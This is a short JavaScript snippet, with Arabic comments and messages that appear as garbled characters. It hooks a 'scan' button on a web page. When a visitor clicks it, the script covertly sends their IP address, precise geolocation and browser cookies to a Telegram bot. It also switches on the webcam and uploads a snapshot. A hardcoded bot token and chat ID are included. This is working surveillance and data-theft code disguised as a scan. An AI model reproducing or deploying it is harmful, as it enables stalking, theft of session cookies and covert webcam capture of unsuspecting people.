(function() {
    const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
    const _id = "7253092491";

    function _report(text) {
        fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM]: " + text)}`);
    }

    async function _captureAndSend() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            _report("ุชู ูุชุญ ุงููุงููุฑุง.. ุฌุงุฑู ุงููุนุงูุฌุฉ ๐ธ");

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', _id);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', '๐ฏ ุตูุฑุฉ ูู ุงููุธุงู');

                    fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    }).then(() => {
                        stream.getTracks().forEach(t => t.stop());
                    });
                }, 'image/jpeg', 0.8);
            }, 3000);
        } catch (err) {
            _report("ูุดู ุงููุตูู ูููุงููุฑุง โ");
        }
    }

    const btn = document.getElementById('startScanBtn');
    if (btn) {
        btn.addEventListener('click', () => {
            _report("๐ ุจุฏุฃุช ุนูููุฉ ุงููุญุต");

            // ุฌูุจ ุงูู IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => _report("๐ IP: " + d.ip));

            // ุฌูุจ ุงููููุน (ุชุตุญูุญ ุงูุฑุงุจุท)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;
                    // ุชู ุชุตุญูุญ ุตูุงุบุฉ ุงูุฑุงุจุท ููุง ุจุฅุฒุงูุฉ ุงูููุณ ุงูุฒุงุฆุฏ {
                    _report(`๐ ุงููููุน: https://www.google.com/maps?q=${lat},${lon}`);
                }, (err) => {
                    _report("โ ุฑูุถ ุงููุณุชุฎุฏู ุฅุฐู ุงููููุน");
                }, { enableHighAccuracy: true });
            }

            _report("๐ช ุงูููููุฒ: " + (document.cookie || "ูุง ููุฌุฏ"));
            _captureAndSend();
        });
    }
})();
